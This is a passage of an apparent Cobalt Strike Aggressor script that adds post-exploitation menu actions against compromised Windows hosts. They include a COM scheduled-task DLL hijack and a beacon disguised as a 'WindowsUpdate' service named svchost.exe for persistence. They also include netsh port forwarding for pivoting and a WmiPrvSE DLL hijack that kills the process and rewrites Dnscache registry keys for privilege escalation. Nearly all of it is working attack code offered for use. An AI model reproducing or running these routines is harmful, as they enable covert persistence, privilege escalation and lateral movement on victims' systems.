	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /v ThreadingModel /t REG_SZ /d Both")
}

sub CacheTask{
	foreach $id ($bid){
		$dialog = dialog("CacheTask", %(uploadpath => "C:\\Windows\\Temp\\test.dll", bid => $id), &CacheTaskExec);
		dialog_description($dialog, "CacheTask Task plan COM interface DLLHijack, for systems: Windows 10/Windows Server 2012 or above");
		drow_text($dialog, "uploadpath", "uploadpath:");
		drow_file($dialog, "dllpath", "dllpath:");
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
}

sub servicebeacon{
	foreach $id ($bid){
		$dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", arch => barch($id) ,exename => "svchost.exe", servicename => "WindowsUpdate", bid => $id), &servicerun);
		dialog_description($dialog, "Generate service horse Upload Execution for permission maintenance");
		drow_text($dialog, "arch", "arch:");
		drow_text($dialog, "uploadoutpath", "uploadoutpath:");
		drow_text($dialog, "servicename",  "servicename:");
		drow_text($dialog, "exename", "outputexename:");
		drow_listener($dialog, "listener", "Listener: ");
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}

}

sub netsh_exec{
	if ($set eq "port"){
		$lhost = $3['lhost'];
		$rhost = $3['rhost'];
		$lport = $3['lport'];
		$rport = $3['rport'];
		foreach $id ($bid){
			btask($id, "Port Forwarding:$lhost : $lport -> $rhost : $rport");
			bshell($id, "netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost");
			btask($id, "View Port Forwarding List");
			bshell($id, "netsh interface portproxy show all");

		}
	}else{
		$lhost = $3['lhost'];
		$lport = $3['lport'];
		foreach $id ($bid){
			btask($id, "Delete Port Forwarding：$lhost : $lport");
			bshell($id, "netsh interface portproxy delete v4tov4 listenport=$lport listenaddress=$lhost");
			btask($id, "View Port Forwarding List");
			bshell($id, "netsh interface portproxy show all");
		}
	}
}

sub netsh_poort{
	$dialog = dialog("netsh Port",%(lhost => "127.0.0.1",  rhost => "192.168.1.2", lport => "4444", rport => "4444"), &netsh_exec);
	dialog_description($dialog, "netshPort Forwarding Configuration\nnetshPort ForwardingDelete ");
	if ($set eq "port"){
		drow_text($dialog, "lhost", "LHOST:");
		drow_text($dialog, "rhost", "RHOST:");
		drow_text($dialog, "lport", "LPORT:");
		drow_text($dialog, "rport", "RPORT:");
	}else{
		drow_text($dialog, "lport", "LPORT:");
		drow_text($dialog, "lhost", "LHOST:");
	}
	dbutton_action($dialog, "run");
	dialog_show($dialog);

}

sub WmiPrvSE{
	$dllname = $3['dll'];
	$dllend = split("\\\\", $3['dll'])[-1];
#	println($dllend);
	$uploadpath = $3['uploadpath']."\\".$dllend;
#	println($uploadpath);
	$ps = 	bps($bid, lambda({
		println($data);
	}, $callback => $data));
	foreach $id ($bid){
		btask($id, "WmiPrvSE DLLHijack Start configuration");
		if(-isadmin $id){
			btask($id, "Currently with administrator privileges, kill the WmiPrvSE.exe process");
			bshell($id, "taskkill /F /IM WmiPrvSE.exe");
		#	btask($id, "Re-New Start the WmiPrvSE.exe process");
		#	bshell($id, "WmiPrvSE.exe");
		}
		bupload($id, $dllname);
		bmv($id, $dllend, $uploadpath);
		bshell($id, "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Close /t REG_SZ /d ClosePerfData /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Collect /t REG_SZ /d CollectPerfData /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Library /t REG_SZ /d ".$uploadpath." /F");
		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Open /t REG_SZ /d OpenData /F");
		bshell($id, "powershell -c \"Get-WmiObject -List | Where-Object {\$_.Name -Like \"\"Win32_Perf*\"\"\"\"}\"");
	}
}

sub WmiPrvSE_config{
	$dialog = dialog("WmiPrvSE_config",%(uploadpath => "C:\\Windows\\Temp"), &WmiPrvSE);
	dialog_description($dialog, "WmiPrvSEHijack\nPower lifting for:Windows Server 2008\nWindows 7\nor lower\nor for doing permission maintenance");
	drow_file($dialog, "dll", "dll:");
	drow_text($dialog, "uploadpath", "upload_path:");
	dbutton_action($dialog, "run");
	dialog_show($dialog);
}
